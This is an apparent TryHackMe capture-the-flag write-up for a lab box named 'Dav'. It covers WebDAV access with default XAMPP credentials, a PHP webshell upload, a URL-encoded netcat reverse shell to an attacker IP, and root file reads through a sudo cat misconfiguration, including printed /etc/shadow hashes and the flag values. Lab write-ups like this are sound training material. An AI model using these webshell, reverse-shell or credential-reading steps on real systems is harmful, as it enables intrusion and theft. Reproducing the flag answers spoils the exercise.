# 🗂️ Dav: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `dav.thm` |
| **OS** | Ubuntu 16.04 |
| **Attack Surface** | WebDAV with default credentials, unauthenticated PHP file upload via PUT |
| **Privesc** | `sudo /bin/cat` NOPASSWD → arbitrary file read → root flag |

A WebDAV endpoint hidden behind HTTP Basic Auth falls to well-known default credentials (`wampp:xampp`). Once authenticated, `cadaver` drops a PHP webshell via a PUT request. RCE as `www-data` is trivial from there. Privilege escalation skips a shell entirely — `sudo` allows `www-data` to run `/bin/cat` as root with no password, which is enough to read any file on the system including `/root/root.txt`.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -vv -p- dav.thm -oA tcpscan-dav
```

```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Only port 80 open. Default Apache page served at root — nothing interesting there, but the box is named `dav` so WebDAV is the obvious lead.

### Directory Bruteforce

```bash
ffuf -u http://dav.thm/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -fc 403
```

```
webdav    [Status: 401, Size: 454, Words: 42, Lines: 15, Duration: 164ms]
```

`/webdav` responds with a `401 Unauthorized` — HTTP Basic Auth protecting a WebDAV share. 

```bash
ffuf -u http://dav.thm/FUZZ -w ./Web-Content/raft-medium-files.txt -ic -fc 403
```

```
index.html    [Status: 200, Size: 11321, Duration: 163ms]
```

Nothing else of note at the root.

---

## 💀 Initial Access — WebDAV Default Credentials + PHP Shell Upload

### Default Credentials

XAMPP ships WebDAV with default credentials `wampp:xampp`. The server banner (`Apache/2.4.18 (Ubuntu)`) and the share name `/webdav` are consistent with a default XAMPP/WAMPP setup. Tried them directly:

```bash
cadaver http://dav.thm/webdav
# Username: wampp
# Password: xampp
```

```
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav    44  Aug 26  2019
```

In. The `passwd.dav` file is the htpasswd file used to protect the share — confirms the XAMPP default setup.

```bash
dav:/webdav/> get passwd.dav
```

### PHP Webshell Upload

WebDAV's `PUT` method lets authenticated users upload arbitrary files. No extension filtering in place:

```bash
# shell.php
<?php system($_GET['cmd']); ?>
```

```bash
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 88 bytes succeeded.

dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav    44  Aug 26  2019
        shell.php     88  Apr 14 22:53
```

### Remote Code Execution

```
http://dav.thm/webdav/shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`. Upgraded to a reverse shell via a URL-encoded mkfifo payload:

```
http://dav.thm/webdav/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%20192.168.204.251%204444%20%3E%2Ftmp%2Ff
```

```bash
# listener
nc -nlvp 4444
```

```
connect to [192.168.204.251] from (UNKNOWN) [10.113.180.21] 42516
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo; fg
export TERM=xterm
```

### User Flag

Two users on the box — `merlin` (uid 1000, in sudo group) and `wampp` (uid 1001). `merlin`'s home has world-readable `user.txt`:

```bash
cat /home/merlin/user.txt
```

```
449b40fe93f78a938523b7e4dcd66d2a
```

---

## 🔁 Privilege Escalation — sudo `/bin/cat` → Root Flag

### sudo Misconfiguration

```bash
sudo -l
```

```
User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

`www-data` can run `/bin/cat` as any user, no password required. That's an unrestricted read primitive on the entire filesystem.

```bash
sudo /bin/cat /root/root.txt
```

```
101101ddc16b0cdf65ba0b8a7af7afa5
```

### Bonus — Sensitive Files via cat

The same primitive exposes `/etc/shadow` and any other protected file:

```bash
sudo /bin/cat /etc/shadow
# merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:...   (MD5crypt — crackable)
# wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKDv1FFxKsr/:18134:...

sudo /bin/cat /home/merlin/.bash_history
# full setup history for the WebDAV config — explains the whole box
```

### Attempted Kernel Exploit (Failed)

```bash
uname -a
# Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019
sudo --version
# Sudo version 1.8.16
```

Tried CVE-2021-3156 (Baron Samedit) for a full root shell — failed due to glibc version requirement:

```bash
python3 exploit.py
# AssertionError: glibc is too old. The exploit is relied on glibc tcache feature. Need version >= 2.26
```

Kernel 4.4.0 and Sudo 1.8.16 are both potentially vulnerable to other exploits, but the `sudo cat` misconfiguration already handed over the flag — no need to go further.

---

## 🗺️ Attack Chain

```
[Port 80 — Apache 2.4.18 (Ubuntu)]
    ffuf → /webdav (401 Unauthorized)
          │
          ▼
[Default WebDAV Credentials]
    wampp:xampp (XAMPP/WAMPP default) → cadaver authenticated session
          │
          ▼
[PHP Shell Upload via WebDAV PUT]
    cadaver put shell.php → no extension filtering
          │
          ▼
[RCE — www-data]
    /webdav/shell.php?cmd=id → confirmed execution
    mkfifo reverse shell → www-data foothold
          │
          ▼
[sudo Misconfiguration]
    (ALL) NOPASSWD: /bin/cat → arbitrary file read
    sudo /bin/cat /root/root.txt → root flag
```

---

## 📌 Key Takeaways

- Default credentials on internal services are a direct, trivial entry point — XAMPP's `wampp:xampp` is publicly documented and should be treated as burned the moment a service goes live
- WebDAV `PUT` with no file type validation is equivalent to a remote file write primitive — always restrict uploadable extensions or disable WebDAV entirely if not needed
- `sudo` entries for file read utilities (`cat`, `less`, `tail`, `head`) are often treated as "harmless" but grant full read access to the filesystem — `/etc/shadow`, SSH keys, and any secret file are all in scope
- Kernel version and Sudo version enumeration matters — 4.4.0 + 1.8.16 is an old, unpatched stack, though glibc version can be the deciding factor in whether heap-based exploits land

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ffuf` | Directory bruteforce to discover /webdav |
| `cadaver` | Authenticated WebDAV client for PHP shell upload |
| `nc` | Reverse shell listener |
| `python3` | Shell stabilisation (pty.spawn) |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `449b40fe93f78a938523b7e4dcd66d2a` |
| `root.txt` | `101101ddc16b0cdf65ba0b8a7af7afa5` |
